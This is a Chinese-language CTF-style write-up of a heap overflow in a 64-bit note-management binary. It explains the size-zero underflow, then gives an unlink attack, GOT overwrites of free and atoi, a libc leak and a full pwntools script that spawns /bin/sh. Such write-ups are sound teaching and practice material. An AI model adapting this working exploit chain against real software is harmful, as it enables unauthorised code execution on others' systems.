# 漏洞利用文档

## 执行环境
基于提供的反编译代码和exp分析，程序运行环境如下：
- **二进制类型**：64位ELF可执行文件，使用GCC编译
- **安全特性**（通过checksec推断）：
  - **NX Enabled**：堆栈不可执行（exp使用GOT覆盖而非shellcode）
  - **No PIE**：代码段和数据段地址固定（如0x400000、0x602000）
  - **Partial RELRO**：GOT表可写（允许覆盖GOT条目）
  - **Stack Canary**：可能存在栈保护（但漏洞利用未触发栈溢出）
- **依赖库**：依赖标准libc（如libc.so.6），通过ldd可查看具体版本
- **运行需求**：Linux环境，需要标准输入输出，alarm(60)设置超时

## 漏洞成因
### 关键结构体分析
- **全局管理结构**：
  - 指针数组 `ptr`（地址0x6020c8）：存储7个笔记指针（每个8字节）
  - 大小数组 `qword_6020C0`（地址0x602100）：存储对应笔记的大小
  - 最后操作指针 `qword_6020C0[0]`：指向最近操作的笔记
- **堆块结构**：标准ptmalloc chunk，包含prev_size（8字节）、size（8字节）和用户数据

### 漏洞分析
漏洞位于输入函数 `sub_4008DD` 中，当笔记大小为0时触发堆溢出：
- **根本原因**：在编辑笔记时，`sub_4008DD` 的第二个参数 `a2`（笔记大小）为0，导致无符号整数下溢：
  - `a2 - 1` 结果为 `18446744073709551615`（64位最大值）
  - 循环条件 `a2 - 1 > i` 始终成立，允许读取任意长度数据直到遇到换行符
- **触发路径**：
  1. 新建笔记时指定大小为0（如 `new(b'0', b'aaaa')`）
  2. 编辑该笔记时，`sub_4008DD` 允许写入超过分配大小的数据
  3. 堆溢出覆盖相邻chunk的元数据（prev_size和size字段）
- **漏洞类型**：堆溢出（Heap Overflow）导致内存破坏

## 漏洞利用过程
利用过程分为五个阶段，通过堆溢出和unlink攻击实现任意地址写，最终劫持GOT表获取shell。以下表格总结了关键内存变化：

| 利用阶段 | 操作 | 堆布局变化 | 全局指针变化 | GOT表变化 | Bins状态 |
|---------|------|------------|-------------|-----------|----------|
| **初始状态** | - | 堆为空 | 所有指针为NULL | 原始libc地址 | 所有bins为空 |
| **阶段1: 堆初始化** | `new(b'0', b'aaaa')` 等4次 | 分配4个chunk：chunk0(33B)、chunk1(256B)、chunk2(256B)、chunk3(256B) | ptr[0-3]指向各chunk | 无变化 | 所有bins为空 |
| **阶段2: 堆溢出** | `edit(b'0', payload)` | 覆盖chunk1 size为0x121，伪造chunk2 fd/bk指向全局变量 | 无变化 | 无变化 | 所有bins为空 |
| **阶段3: Unlink攻击** | `delete(b'1')` | chunk1和chunk2合并为545字节块 | ptr[2]从0x2619c140变为0x6020c0 | 无变化 | unsortedbin包含合并块 |
| **阶段4: 任意写建立** | `edit(b'2', payload)` | 无变化 | ptr[0]指向free_got，ptr[1]指向atoi_got | 无变化 | unsortedbin保持 |
| **阶段5: GOT覆盖** | `edit(b'0', p64(puts_plt))` | 无变化 | 无变化 | free_got覆盖为puts_plt | unsortedbin保持 |
| **阶段6: Libc泄漏** | `delete(b'2')` | 无变化 | ptr[2]设置为NULL | 无变化 | unsortedbin更新 |
| **阶段7: System劫持** | `edit(b'3', p64(system_addr))` | 无变化 | 无变化 | atoi_got覆盖为system | unsortedbin保持 |
| **阶段8: Shell获取** | `p.sendline(b'/bin/sh')` | 进程切换到dash堆布局 | dash全局结构 | dash的GOT表 | dash的bins状态 |

### 详细内存演变
1. **堆溢出准备**：通过编辑size=0的chunk0，payload覆盖chunk1和chunk2的元数据：
   - 伪造chunk2的fd=0x6020c0（全局变量区），bk=0x6020c8
   - 修改chunk3的prev_size和size字段
2. **Unlink触发**：删除chunk1时，glibc的unlink宏检查fd->bk == bk->fd == chunk2，由于伪造的指针满足条件，执行 `*(0x6020d8) = 0x6020c0`
3. **任意写利用**：通过编辑chunk2（现在指向全局变量区）修改ptr[0]和ptr[1]指向GOT表
4. **GOT劫持**：依次覆盖free_got为puts_plt（用于泄漏），atoi_got为system（用于执行）
5. **进程切换**：输入"/bin/sh"被atoi处理（实际执行system("/bin/sh")），成功启动dash shell

## Exploit
以下是完整的漏洞利用脚本，在关键位置添加注释：

```python
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/sample16')
elf = ELF('./data/sample16')
libc = elf.libc

# 全局地址定义
ptr = 0x6020C8
free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']

def new(size, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'1')
    p.recvuntil(b'1024)\n')
    p.sendline(size)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def show():
    p.recvuntil(b'>>\n')
    p.sendline(b'2')

def edit(idx, content):
    p.recvuntil(b'>>\n')
    p.sendline(b'3')
    p.recvuntil(b'note:\n')
    p.sendline(idx)
    p.recvuntil(b'content:\n')
    p.sendline(content)

def delete(idx):
    p.recvuntil(b'>>\n')
    p.sendline(b'4')
    p.recvuntil(b'note:\n')
    p.sendline(idx)

# 阶段1: 堆布局初始化
# 分配4个笔记，chunk0大小为0用于触发溢出
new(b'0', b'aaaa')
new(b'256', b'aaaa')
new(b'256', b'aaaa')
new(b'256', b'aaaa')

# 阶段2: 堆溢出攻击
# 构造payload覆盖相邻chunk元数据，伪造fd/bk用于unlink
fd = ptr + 0x10 - 0x18
bk = ptr + 0x10 - 0x10
payload = p64(0) * 3 + p64(0x121) + b'a' * 0x110 + p64(0) + p64(0x101) + p64(fd) + p64(bk) + b'a' * (0x100-0x20) + p64(0x100) + p64(0x110)
edit(b'0', payload)

# 阶段3: 触发unlink攻击
# 删除chunk1触发unlink，修改全局指针ptr[2]指向全局变量区
delete(b'1')

# 阶段4: 建立任意写原语
# 通过chunk2（现在指向全局变量）修改指针指向GOT表
payload = b'a' * 0x8 + p64(free_got) + p64(atoi_got) + p64(atoi_got) + p64(atoi_got)
edit(b'2', payload)

# 阶段5: GOT覆盖准备泄漏
# 将free_got覆盖为puts_plt，使得调用free时实际执行puts
edit(b'0', p64(puts_plt)[:-1])

# 阶段6: Libc地址泄漏
# 删除chunk2触发free（实际执行puts），泄漏atoi_got内容
delete(b'2')
atoi_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

# 阶段7: 计算system地址并覆盖atoi_got
libc_addr = atoi_addr - libc.symbols['atoi']
system_addr = libc.symbols['system'] + libc_addr
edit(b'3', p64(system_addr)[:-1])

# 阶段8: 获取shell
# 输入"/bin/sh"被atoi（实际system）处理
p.recvuntil(b'>>\n')
p.sendline(b'/bin/sh')
p.interactive()
```

### 关键注释说明
- **堆溢出payload**：精心构造的元数据伪造，确保unlink宏检查通过
- **unlink攻击**：利用glibc的unlink操作实现任意地址写
- **GOT覆盖策略**：分步覆盖free_got和atoi_got，避免过早崩溃
- **Libc计算**：通过泄漏的atoi地址计算libc基址，动态获取system地址
- **进程交互**：最终通过atoi劫持执行system("/bin/sh")，成功获取shell

此漏洞利用展示了典型的堆溢出结合unlink攻击的完整链，适用于类似内存管理漏洞的利用场景。
